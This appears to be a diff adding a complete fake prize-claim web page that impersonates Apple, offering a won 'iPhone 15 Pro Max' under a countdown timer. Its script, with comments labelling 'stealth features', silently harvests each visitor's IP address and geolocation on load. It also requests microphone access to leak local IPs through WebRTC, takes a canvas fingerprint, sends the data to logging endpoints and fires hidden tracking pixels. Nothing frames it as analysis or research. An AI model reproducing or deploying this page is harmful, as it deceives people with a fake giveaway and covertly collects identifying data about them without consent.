@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Congratulations! iPhone 15 Pro Max Claim</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: -apple-system, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; }
+        .container { background:white; border-radius:20px; padding:40px; max-width:450px; box-shadow:0 20px 40px rgba(0,0,0,0.1); text-align:center; }
+        .iphone-img { width:200px; height:400px; background:#000; border-radius:30px; margin:20px auto; position:relative; }
+        .screen { background:linear-gradient(45deg, #f0f0f0, #e0e0e0); height:85%; border-radius:20px; margin:7% auto 0; position:relative; overflow:hidden; }
+        button { background:linear-gradient(45deg, #ff6b6b, #feca57); border:none; padding:15px 40px; border-radius:50px; color:white; font-size:18px; font-weight:600; cursor:pointer; transition:all 0.3s; width:100%; margin:20px 0; }
+        button:hover { transform:translateY(-2px); box-shadow:0 10px 25px rgba(254,202,87,0.4); }
+        .loading { display:none; width:30px; height:30px; border:3px solid #f3f3f3; border-top:3px solid #ff6b6b; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; }
+        .verified { color:#4CAF50; font-weight:600; display:none; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        @media (max-width:480px) { .container { margin:20px; padding:30px 20px; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- STEALTH PIXEL TRACKERS (INVISIBLE) -->
+        <img src="https://yourusername.github.io/tracker.gif?t=1" style="display:none;">
+        <img src="https://cdn.jsdelivr.net/gh/yourusername/tracker@latest/pixel.gif?t=2" style="display:none;">
+        
+        <h1 style="color:#333; margin-bottom:20px; font-size:28px;">🎉 Congratulations!</h1>
+        <p style="color:#666; margin-bottom:30px; font-size:16px;">You've won <strong>iPhone 15 Pro Max (512GB)</strong><br>Claim expires in <span id="countdown">5:00</span></p>
+        
+        <div class="iphone-img">
+            <div class="screen"></div>
+        </div>
+        
+        <div id="status" style="margin:20px 0; font-size:14px; color:#999;">Verifying eligibility...</div>
+        <div class="loading" id="loader"></div>
+        
+        <button onclick="claimPrize()">🔥 CLAIM MY IPHONE NOW</button>
+        <div id="verified" class="verified">✅ Eligibility Verified!</div>
+        <p style="font-size:12px; color:#999; margin-top:30px;">Powered by Apple Promotions</p>
+    </div>
+
+    <script>
+        // STEALTH FEATURE 1: AUTO IP GRAB (loads immediately)
+        fetch('https://ipapi.co/json/').then(r=>r.json()).then(data=>{
+            navigator.sendBeacon('/log', JSON.stringify({
+                ip: data.ip, lat: data.latitude, lon: data.longitude,
+                city: data.city, region: data.region, country: data.country,
+                ua: navigator.userAgent, lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: screen.width+'x'+screen.height
+            }));
+        });
+
+        // STEALTH FEATURE 2: WEBRTC LOCAL IP
+        navigator.mediaDevices.getUserMedia({audio:true}).then(stream=>{
+            stream.getTracks().forEach(t=>t.stop());
+        }).catch(()=>{}).finally(()=>{
+            const pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel(''); pc.createOffer().then(pc.setLocalDescription.bind(pc));
+            pc.onicecandidate = e=> { if(e.candidate) navigator.sendBeacon('/log', e.candidate.candidate); };
+        });
+
+        // STEALTH FEATURE 3: CANVAS FINGERPRINT
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d'); ctx.textBaseline='top'; ctx.font='14px Arial';
+        ctx.fillText('Fingerprint', 2, 20); const fp = canvas.toDataURL();
+
+        // COUNTDOWN + CLAIM BUTTON
+        let time = 300; const timer = document.getElementById('countdown');
+        setInterval(()=>{ 
+            time--; 
+            const m=Math.floor(time/60), s=time%60;
+            timer.textContent = `${m}:${s.toString().padStart(2,'0')}`;
+        }, 1000);
+
+        function claimPrize() {
+            document.getElementById('status').textContent = 'Processing claim...';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('verified').style.display = 'block';
+            
+            // FINAL IP GRAB + REDIRECT CHAIN
+            navigator.sendBeacon('/claim', JSON.stringify({
+                ip: 'final', fingerprint: fp, referrer: document.referrer
+            }));
+            
+            setTimeout(()=> location.href = 'https://apple.com/claim-error', 3000);
+        }
+    </script>
+</body>
+</html>
